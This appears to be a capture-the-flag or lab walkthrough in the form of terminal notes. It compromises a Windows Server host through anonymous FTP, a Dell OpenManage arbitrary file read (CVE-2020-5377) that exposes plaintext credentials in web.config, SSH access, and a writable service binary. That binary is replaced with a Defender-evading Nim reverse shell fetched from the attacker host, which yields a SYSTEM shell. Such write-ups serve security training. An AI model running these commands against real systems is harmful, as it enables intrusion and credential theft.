## INFORMATION GATHERING
```bash
# IP ADDRESS
10.10.85.136
# HOSTNAME //Found Post Initial Enumeration
hacksmartersec
# OPERATING SYSTEM //Found Post Initial Enumeration
OS Name:                   Microsoft Windows Server 2019 Datacenter
OS Version:                10.0.17763 N/A Build 17763
# CREDENTIALS //Found Post Initial Enumeration
tyler:IAmA1337h4x0randIkn0wit!
```
## OPEN PORTS DETAILS
```bash
21/tcp   open  ftp           syn-ack ttl 125 Microsoft ftpd

22/tcp   open  ssh           syn-ack ttl 125 OpenSSH for_Windows_7.7 (protocol 2.0)

80/tcp   open  http          syn-ack ttl 125 Microsoft IIS httpd 10.0

1311/tcp open  ssl/rxmon?    syn-ack ttl 125

3389/tcp open  ms-wbt-server syn-ack ttl 125 Microsoft Terminal Services
```
# ENUMERATION
## PORT 21 
```bash
- Anonymous login allowed
sudo ftp ftp://anonymous:anonymous@$ip
Connected to 10.10.85.136.
220 Microsoft FTP Service
331 Anonymous access allowed, send identity (e-mail name) as password.
230 User logged in.
Remote system type is Windows_NT.
200 Type set to I.
ftp> dir
229 Entering Extended Passive Mode (|||49818|)
150 Opening ASCII mode data connection.
06-28-23  02:58PM                 3722 Credit-Cards-We-Pwned.txt
06-28-23  03:00PM              1022126 stolen-passport.png
226 Transfer complete.
ftp> get Credit-Cards-We-Pwned.txt
local: Credit-Cards-We-Pwned.txt remote: Credit-Cards-We-Pwned.txt
229 Entering Extended Passive Mode (|||49820|)
150 Opening BINARY mode data connection.
100% |************************************************************************************************************************************************|  3722       10.02 KiB/s    00:00 ETA
226 Transfer complete.
3722 bytes received in 00:00 (10.02 KiB/s)
ftp> get stolen-passport.png
local: stolen-passport.png remote: stolen-passport.png
229 Entering Extended Passive Mode (|||49822|)
150 Opening BINARY mode data connection.
100% |************************************************************************************************************************************************|   998 KiB  252.10 KiB/s    00:00 ETA
226 Transfer complete.
1022126 bytes received in 00:03 (252.04 KiB/s)
ftp> pwd
Remote directory: /
ftp> quit
221 Goodbye.

- Seems like the files Credit-Cards-We-Pwned.txt, stolen-passport.png doesn;t contain anything interesting
```
## PORT 80
```bash
# Recon
sudo whatweb $url | sed 's/,/\n/g'
http://10.10.85.136 [200 OK] Bootstrap
 Country[RESERVED][ZZ]
 HTML5
 HTTPServer[Microsoft-IIS/10.0]
 IP[10.10.85.136]
 JQuery[3.4.1]
 Microsoft-IIS[10.0]
 Script[text/javascript]
 Title[HackSmarterSec]
 X-UA-Compatible[IE=edge]

# Fuzzing
sudo gobuster dir -w /usr/share/wordlists/dirb/common.txt -b 403,404 -o fuzz/gobuster-common.txt -e -t 20 -u $url/
http://10.10.85.136/css                  (Status: 301) [Size: 147] [--> http://10.10.85.136/css/]
http://10.10.85.136/images               (Status: 301) [Size: 150] [--> http://10.10.85.136/images/]
http://10.10.85.136/Images               (Status: 301) [Size: 150] [--> http://10.10.85.136/Images/]
http://10.10.85.136/index.html           (Status: 200) [Size: 3998]
http://10.10.85.136/js                   (Status: 301) [Size: 146] [--> http://10.10.85.136/js/]
```
## PORT 1311
```bash
# Recon
sudo whatweb $url | sed 's/,/\n/g'
https://10.10.85.136:1311 [200 OK] Country[RESERVED][ZZ]
 IP[10.10.85.136]
 Meta-Refresh-Redirect[./OMSALogin?msgStatus=]
 Prototype
 Script[javascript]
 Strict-Transport-Security[max-age=0]
 Title[OpenManage&trade;]
 UncommonHeaders[x-content-type-options]
 X-Frame-Options[SAMEORIGIN]
 X-XSS-Protection[1; mode=block]
 
https://10.10.85.136:1311/OMSALogin?msgStatus= [200 OK] Country[RESERVED][ZZ]
 Frame
 IP[10.10.85.136]
 Script[javascript
text/javascript]
 Strict-Transport-Security[max-age=0]
 Title[Dell EMC OpenManage]
 UncommonHeaders[x-content-type-options]
 X-Frame-Options[SAMEORIGIN]
 X-XSS-Protection[1; mode=block]

# Note
- Found 
	- Dell EMC OpenManage
- Checking About page
	- Version 9.4.0.2

# Exploit 
- Dell OpenManage Server Administrator 9.4.0.0 - Arbitrary File Read
	- https://raw.githubusercontent.com/RhinoSecurityLabs/CVEs/refs/heads/master/CVE-2020-5377_CVE-2021-21514/CVE-2020-5377.py
	- CVE-2020-5377

# LFI
sudo python3 CVE-2020-5377.py 10.13.80.25 10.10.85.136:1311                                                       
[-] No server.pem certificate file found. Generating one...
...+....+...+........+.........+++++++++++++++++++++++++++++++++++++++*..+.+...+...........+......+...+++++++++++++++++++++++++++++++++++++++*...+............+.....+...+.+..............+.........+.+..+............+...+....+...+........+....+.....+...+.+.....+.+...........+...+...................+..+...............+......+....+........++++++
.+++++++++++++++++++++++++++++++++++++++*..+.+++++++++++++++++++++++++++++++++++++++*..+..................+.....+.+......+.....+....+...+..+...............+.............+..+...+.+.........+..+...+................+.....+....+......+.....+.+..............+....+..+.+.....+..........+...............+..............+...+.............+..+......+.+...+.....+................+..+....+..............+.+...+...+...............+..+.....................+.........+.+.....+......+...+......+.........+.+..+...+............+....+.....+.........+....+......+.........+.....+...+....+........+.............+...+.....+.+..............+......+......+...+.......+...+..+.......+...+.........+...+..+...+.......+........+..........+.....+.+...............+..+..........+.....+.........+.+.....+..........+...+..+....+...+..+....+......+...+......+..+...+.........+.+.....+......+....+......+...+........+..........+...+...........+.+...+..............+..........+.....+.......+......+..+.......+...........+....+...+.....+.......+...+..+....+..++++++
-----
Session: 58F0A9FA547A2268DADE478BE3D750C9
VID: 9D1C04704CC45F29
file > C:/boot.ini
Reading contents of C:/boot.ini:

file > C:/Windows/win.ini 
Reading contents of C:/Windows/win.ini :
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1

- Usually the config ofweb application are stored on web.config file 
- checking for web.config file

file > C:/inetpub/wwwroot/web.config
Reading contents of C:/inetpub/wwwroot/web.config:

- As the site name is hacksmartersec expecting the folder name as hacksmartersec

file > C:/inetpub/wwwroot/hacksmartersec/web.config
Reading contents of C:/inetpub/wwwroot/hacksmartersec/web.config:
<configuration>
  <appSettings>
    <add key="Username" value="tyler" />
    <add key="Password" value="IAmA1337h4x0randIkn0wit!" />
  </appSettings>
  <location path="web.config">
    <system.webServer>
      <security>
        <authorization>
          <deny users="*" />
        </authorization>
      </security>
    </system.webServer>
  </location>
</configuration>

- Found creds
tyler:IAmA1337h4x0randIkn0wit!
```
## INITIAL FOOTHOLD
```bash
# Use creds to login via ssh
sudo ssh tyler@$ip                
The authenticity of host '10.10.85.136 (10.10.85.136)' can't be established.
ED25519 key fingerprint is SHA256:MvevGrInODrfb/nv+rYdT743Q0BOkhOmNo5qlrhXCUg.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:1: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.85.136' (ED25519) to the list of known hosts.
tyler@10.10.85.136's password: 
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

tyler@HACKSMARTERSEC C:\Users\tyler>whoami
hacksmartersec\tyler
```
## PRIVILEGE ESCALATION
```bash
- Found process spoofer-scheduler
PS C:\Users\tyler> Get-Process
    204      11     1744       9248              2028   0 spoofer-scheduler

- Exploit 
	- https://packetstorm.news/files/id/166553

sc.exe qc "spoofer-scheduler"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: spoofer-scheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files (x86)\Spoofer\spoofer-scheduler.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Spoofer Scheduler
        DEPENDENCIES       : tcpip
        SERVICE_START_NAME : LocalSystem

- PATH
	- C:\Program Files (x86)\Spoofer\spoofer-scheduler.exe

- Able to write files to the folder
PS C:\Users\tyler> cd 'C:\Program Files (x86)\Spoofer\' 
PS C:\Program Files (x86)\Spoofer> echo test > test.txt 
PS C:\Program Files (x86)\Spoofer> dir 
    Directory: C:\Program Files (x86)\Spoofer
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        7/24/2020   9:31 PM          16772 CHANGES.txt
-a----        7/16/2020   7:23 PM           7537 firewall.vbs
-a----        7/24/2020   9:31 PM          82272 LICENSE.txt
-a----        7/24/2020   9:31 PM           3097 README.txt
-a----        7/24/2020   9:31 PM          48776 restore.exe
-a----        7/20/2020  11:12 PM         575488 scamper.exe
-a----        6/30/2023   6:57 PM            152 shortcuts.ini
-a----        7/24/2020   9:31 PM        4315064 spoofer-cli.exe
-a----        7/24/2020   9:31 PM       16171448 spoofer-gui.exe
-a----        7/24/2020   9:31 PM        4064696 spoofer-prober.exe
-a----        7/24/2020   9:31 PM        8307640 spoofer-scheduler.exe
-a----         3/8/2025  11:08 AM             14 test.txt
-a----        7/24/2020   9:31 PM            667 THANKS.txt
-a----        7/24/2020   9:31 PM         217416 uninstall.exe

- Msfvenom payload didn't work as Windows Defender was turned on
- Payloads get auto deleted :(

- Checked Online found nim shell
- https://github.com/Sn1r/Nim-Reverse-Shell

# Payload
- Copy rev_shell.nim from https://github.com/Sn1r/Nim-Reverse-Shell
- Edit LHOST and LPORT

nim c -d:mingw --app:gui rev_shell.nim

- It created a file name rev_shell.exe
- Transfer rev_shell.exe
- Start Listener

PS C:\Program Files (x86)\Spoofer> Invoke-WebRequest -Uri http://10.13.80.25/rev_shell.exe -OutFile .\rev.exe

PS C:\Program Files (x86)\Spoofer> sc.exe stop "spoofer-scheduler"

SERVICE_NAME: spoofer-scheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x2
        WAIT_HINT          : 0x0
PS C:\Program Files (x86)\Spoofer> sc.exe start "spoofer-scheduler"

sudo rlwrap nc -nvlp 80
listening on [any] 80 ...
connect to [10.13.80.25] from (UNKNOWN) [10.10.85.136] 49853
C:\Windows\system32> whoami
nt authority\system
```
# ENUMERATION OUTPUTS
## NMAP
```bash
# Nmap 7.95 scan initiated Sat Mar  8 16:10:11 2025 as: /usr/lib/nmap/nmap -p 21,22,80,1311,3389 -sC -sV -vv -oN nmap/scan-script-version 10.10.85.136
Nmap scan report for 10.10.85.136
Host is up, received echo-reply ttl 125 (0.36s latency).
Scanned at 2025-03-08 16:10:14 IST for 79s

PORT     STATE SERVICE       REASON          VERSION
21/tcp   open  ftp           syn-ack ttl 125 Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 06-28-23  02:58PM                 3722 Credit-Cards-We-Pwned.txt
|_06-28-23  03:00PM              1022126 stolen-passport.png
22/tcp   open  ssh           syn-ack ttl 125 OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 0d:fa:da:de:c9:dd:99:8d:2e:8e:eb:3b:93:ff:e2:6c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDBQEQMtEIvOihpoAKa9mb4xibUA3epuSK6Rxxs+DoZW3vnh+jS+sRfqlylP7y/n4IzGUuaWlZVKpUq7BpYWy+b6CUQG59eniRhqIbPnQMxgj10aGNB2cwSWJiw7eHL5ifWJpPzhcESEpIo+y7DtWPffqWxU/nVp1gTc9Yq9SrumwiFuzT+CV1MzyMBuqqlhydQ2bmRKY8OPBylO1IfB0vUmttRekXQv5Hzj8+EuY9AyR1Dd/VIPyTAu6azseLp+XRkmbj/SDFCyVFzmcJWrd0U1TRO9JgyqMqpJ1sXaLdLvhN6cF8+TgvQrzIHktXcuuYs0VTxOcGLT6rxgTjvI4SR
|   256 5d:0c:df:32:26:d3:71:a2:8e:6e:9a:1c:43:fc:1a:03 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLo3VekZ7ilJh7VVErMMXBCMy6+xLbnG+S3p4AGRj+CYOojmR0hZcEC6m/bk/4wZbI8hqfi7WXkHzb9k229IAwM=
|   256 c4:25:e7:09:d6:c9:d9:86:5f:6e:8a:8b:ec:13:4a:8b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKrfRbBfOafQZpZ/1PAOouyK5o+rG5uKKPllhZk91Q+m
80/tcp   open  http          syn-ack ttl 125 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: HackSmarterSec
1311/tcp open  ssl/rxmon?    syn-ack ttl 125
| ssl-cert: Subject: commonName=hacksmartersec/organizationName=Dell Inc/stateOrProvinceName=TX/countryName=US/organizationalUnitName=SA Enterprise Software Development/localityName=Round Rock
| Issuer: commonName=hacksmartersec/organizationName=Dell Inc/stateOrProvinceName=TX/countryName=US/organizationalUnitName=SA Enterprise Software Development/localityName=Round Rock
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-06-30T19:03:17
| Not valid after:  2025-06-29T19:03:17
| MD5:   4276:b53d:a8ab:fa7c:10c0:1535:ff41:2928
| SHA-1: c44f:51f8:ed54:802f:bb94:d0ea:705d:50f8:fd96:f49f
| -----BEGIN CERTIFICATE-----
| MIIDtjCCAp6gAwIBAgIJAJiVCPPKPIZQMA0GCSqGSIb3DQEBCwUAMIGIMQswCQYD
| VQQGEwJVUzELMAkGA1UECBMCVFgxEzARBgNVBAcTClJvdW5kIFJvY2sxKzApBgNV
| BAsTIlNBIEVudGVycHJpc2UgU29mdHdhcmUgRGV2ZWxvcG1lbnQxETAPBgNVBAoT
| CERlbGwgSW5jMRcwFQYDVQQDEw5oYWNrc21hcnRlcnNlYzAeFw0yMzA2MzAxOTAz
| MTdaFw0yNTA2MjkxOTAzMTdaMIGIMQswCQYDVQQGEwJVUzELMAkGA1UECBMCVFgx
| EzARBgNVBAcTClJvdW5kIFJvY2sxKzApBgNVBAsTIlNBIEVudGVycHJpc2UgU29m
| dHdhcmUgRGV2ZWxvcG1lbnQxETAPBgNVBAoTCERlbGwgSW5jMRcwFQYDVQQDEw5o
| YWNrc21hcnRlcnNlYzCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAID1
| 0qf1d/s31Fj8jgv7MtEHjRYX41B+o2p4M5TEIw3kWGrZmfxasZb7KP8lCKcS1+2x
| U08mCd2k0OfnGaeJIqnnzrQlkjhM/EVC+6LXOnC65rpaAmZXeKuH0YzFKSbmSt5k
| 7iTFoYH/QPLKn/lXxlCl4y4x73pCvttLOKtqcoO0a1Rf67kCnHuaRGVfWlidsUYe
| AIWsP8sq/kx+AhOTv4WRK/2Dx51emAguT8167rfiUbu9o6cf0hGhvO9V/d9SLcht
| sF8KVlAYZLHo6Vyzxf412+L2DrxqZoF6v3T8srvj4WMHt8m3lbyxizE68TCmQXzD
| SWoUUhpcv8xQBVCp860CAwEAAaMhMB8wHQYDVR0OBBYEFOADAwMC1j6Zrd4r+sYx
| V7aussbQMA0GCSqGSIb3DQEBCwUAA4IBAQBHVVuwnRybQn2lgUXjQVDWNDhTyV8h
| eKX78tuO/zLOO9H+QvtHnA293NEgsJ1B2hyM+QIfhPxB+uyAh9qkYLwwNWzT5M7i
| JZW2b00Q7JJhyF5ljU6+cQsIc2e9c6ohpka/2YOso18b0McJNZULEf1bkXAgCVFK
| /VUpZqbOUwze/Zyh/UCTY3yLmxmMzkRHIUSCNh7rdi5Rtv/ele0WICTD0eX1Hw0b
| DaUifmqUEI4Lh3SemL5MolJ0FpRrBNznNmWR9xwOFCE1dSaYj8Zo0oaIgJEbkffh
| 9k72dU9PVPMx+kqDak7ntWQHTFuV6GH149dIUPinVmioLAkxPJ2XmoRt
|_-----END CERTIFICATE-----
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Strict-Transport-Security: max-age=0
|     X-Frame-Options: SAMEORIGIN
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     vary: accept-encoding
|     Content-Type: text/html;charset=UTF-8
|     Date: Sat, 08 Mar 2025 10:40:29 GMT
|     Connection: close
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
|     <html>
|     <head>
|     <META http-equiv="Content-Type" content="text/html; charset=UTF-8">
|     <title>OpenManage&trade;</title>
|     <link type="text/css" rel="stylesheet" href="/oma/css/loginmaster.css">
|     <style type="text/css"></style>
|     <script type="text/javascript" src="/oma/js/prototype.js" language="javascript"></script><script type="text/javascript" src="/oma/js/gnavbar.js" language="javascript"></script><script type="text/javascript" src="/oma/js/Clarity.js" language="javascript"></script><script language="javascript">
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Strict-Transport-Security: max-age=0
|     X-Frame-Options: SAMEORIGIN
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     vary: accept-encoding
|     Content-Type: text/html;charset=UTF-8
|     Date: Sat, 08 Mar 2025 10:40:36 GMT
|     Connection: close
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
|     <html>
|     <head>
|     <META http-equiv="Content-Type" content="text/html; charset=UTF-8">
|     <title>OpenManage&trade;</title>
|     <link type="text/css" rel="stylesheet" href="/oma/css/loginmaster.css">
|     <style type="text/css"></style>
|_    <script type="text/javascript" src="/oma/js/prototype.js" language="javascript"></script><script type="text/javascript" src="/oma/js/gnavbar.js" language="javascript"></script><script type="text/javascript" src="/oma/js/Clarity.js" language="javascript"></script><script language="javascript">
3389/tcp open  ms-wbt-server syn-ack ttl 125 Microsoft Terminal Services
|_ssl-date: 2025-03-08T10:41:29+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=hacksmartersec
| Issuer: commonName=hacksmartersec
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-03-07T08:16:34
| Not valid after:  2025-09-06T08:16:34
| MD5:   6242:445b:b1d0:9fd6:3c2a:7d2e:3cc2:00ca
| SHA-1: 445d:1285:bd7e:ada7:7b13:5ca0:eb4b:0f21:af3f:0790
| -----BEGIN CERTIFICATE-----
| MIIC4DCCAcigAwIBAgIQeCMw2qjOPo1GtTIqxYaEgDANBgkqhkiG9w0BAQsFADAZ
| MRcwFQYDVQQDEw5oYWNrc21hcnRlcnNlYzAeFw0yNTAzMDcwODE2MzRaFw0yNTA5
| MDYwODE2MzRaMBkxFzAVBgNVBAMTDmhhY2tzbWFydGVyc2VjMIIBIjANBgkqhkiG
| 9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwUrELEBbYFukCMjnz+XKRsEPIOqR3rehu7go
| uQUYsv+alDqs71Z3I/1l5zCk1BihXs6QzLa2KVSgoloEpP8Fu9do0r6iToCHaHz0
| avCT30bKQt7H7lnAQl2P+ifstZ5e71BSJztMdm3eP3IgrQBOKugp/BL5qKcytxJO
| GgjnacjJtQOlhJGDzIZh/TBJ/9eMgQVM/J3FwIxx/La/YwcUUCbUSSDIRErfmUCG
| /iopPb71gFkSjQ5Q2iVzRAC1VsNCsGr9ao/dNWmOFAZUmqgNfZ25i81Vv41C3bKB
| Q/IJcfV3RdIY+fcuMDJEwNWjColZ2YYDVZWulOaSPrFe046tcQIDAQABoyQwIjAT
| BgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQAD
| ggEBAEggvCFX1X2LXxsUHxFDfEeVZghHiGfu1aY+ZI5a8w0qQ6fqCpPP3rOHkmXv
| jXILH4wluEOOrwODeDV3IDjS2Hyv6BB6e/fhT3qZD+XRKqRPIhoCi5yjbX7jIZ02
| BazsV7XPrEKtGeMguij+BQLIDauoAljdDJKt+vYUecD96nyowa5VumFvSaomqpko
| K5S3SM1hVHiGqUGc18LQGDCKfSZ+AQokBuGwox+kNDsUztN4sEnn11PoLAsRqzsT
| PFA/reoazLbzSvWqTyFZjHTN5uX7Pn/FYnffPqQ9ndhd+l0DK212LUpF17gbF5UE
| ZuX3qJcR4wC91mykIFM5PdV3Oes=
|_-----END CERTIFICATE-----
| rdp-ntlm-info: 
|   Target_Name: HACKSMARTERSEC
|   NetBIOS_Domain_Name: HACKSMARTERSEC
|   NetBIOS_Computer_Name: HACKSMARTERSEC
|   DNS_Domain_Name: hacksmartersec
|   DNS_Computer_Name: hacksmartersec
|   Product_Version: 10.0.17763
|_  System_Time: 2025-03-08T10:41:20+00:00
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1311-TCP:V=7.95%T=SSL%I=7%D=3/8%Time=67CC1E9D%P=x86_64-pc-linux-gnu
SF:%r(GetRequest,1089,"HTTP/1\.1\x20200\x20\r\nStrict-Transport-Security:\
SF:x20max-age=0\r\nX-Frame-Options:\x20SAMEORIGIN\r\nX-Content-Type-Option
SF:s:\x20nosniff\r\nX-XSS-Protection:\x201;\x20mode=block\r\nvary:\x20acce
SF:pt-encoding\r\nContent-Type:\x20text/html;charset=UTF-8\r\nDate:\x20Sat
SF:,\x2008\x20Mar\x202025\x2010:40:29\x20GMT\r\nConnection:\x20close\r\n\r
SF:\n<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\.0\x20Stri
SF:ct//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-strict\.dtd\">\r
SF:\n<html>\r\n<head>\r\n<META\x20http-equiv=\"Content-Type\"\x20content=\
SF:"text/html;\x20charset=UTF-8\">\r\n<title>OpenManage&trade;</title>\r\n
SF:<link\x20type=\"text/css\"\x20rel=\"stylesheet\"\x20href=\"/oma/css/log
SF:inmaster\.css\">\r\n<style\x20type=\"text/css\"></style>\r\n<script\x20
SF:type=\"text/javascript\"\x20src=\"/oma/js/prototype\.js\"\x20language=\
SF:"javascript\"></script><script\x20type=\"text/javascript\"\x20src=\"/om
SF:a/js/gnavbar\.js\"\x20language=\"javascript\"></script><script\x20type=
SF:\"text/javascript\"\x20src=\"/oma/js/Clarity\.js\"\x20language=\"javasc
SF:ript\"></script><script\x20language=\"javascript\">\r\n\x20")%r(HTTPOpt
SF:ions,1089,"HTTP/1\.1\x20200\x20\r\nStrict-Transport-Security:\x20max-ag
SF:e=0\r\nX-Frame-Options:\x20SAMEORIGIN\r\nX-Content-Type-Options:\x20nos
SF:niff\r\nX-XSS-Protection:\x201;\x20mode=block\r\nvary:\x20accept-encodi
SF:ng\r\nContent-Type:\x20text/html;charset=UTF-8\r\nDate:\x20Sat,\x2008\x
SF:20Mar\x202025\x2010:40:36\x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTY
SF:PE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\.0\x20Strict//EN\"\
SF:x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-strict\.dtd\">\r\n<html>\
SF:r\n<head>\r\n<META\x20http-equiv=\"Content-Type\"\x20content=\"text/htm
SF:l;\x20charset=UTF-8\">\r\n<title>OpenManage&trade;</title>\r\n<link\x20
SF:type=\"text/css\"\x20rel=\"stylesheet\"\x20href=\"/oma/css/loginmaster\
SF:.css\">\r\n<style\x20type=\"text/css\"></style>\r\n<script\x20type=\"te
SF:xt/javascript\"\x20src=\"/oma/js/prototype\.js\"\x20language=\"javascri
SF:pt\"></script><script\x20type=\"text/javascript\"\x20src=\"/oma/js/gnav
SF:bar\.js\"\x20language=\"javascript\"></script><script\x20type=\"text/ja
SF:vascript\"\x20src=\"/oma/js/Clarity\.js\"\x20language=\"javascript\"></
SF:script><script\x20language=\"javascript\">\r\n\x20");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 0s, deviation: 0s, median: 0s

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Mar  8 16:11:33 2025 -- 1 IP address (1 host up) scanned in 81.98 seconds
```

